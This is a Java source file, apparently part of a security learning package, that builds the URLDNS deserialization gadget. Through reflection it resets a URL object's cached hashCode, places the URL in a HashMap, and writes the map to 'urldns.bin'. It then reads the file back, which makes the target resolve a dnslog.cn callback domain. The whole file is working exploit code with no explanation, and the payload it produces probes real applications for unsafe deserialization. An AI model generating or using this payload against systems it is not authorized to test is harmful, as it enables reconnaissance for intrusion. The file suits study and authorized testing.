package com.anbai.sec.serializes.URLDNS;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
public class URLDNS {

    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL                   url     = new URL("http://bbb.xen7a4.dnslog.cn");
        Field f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);

        f.set(url, 0x01010101);
        hashMap.put(url, 0);
        f.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.bin"));
        ois.readObject();
    }
}
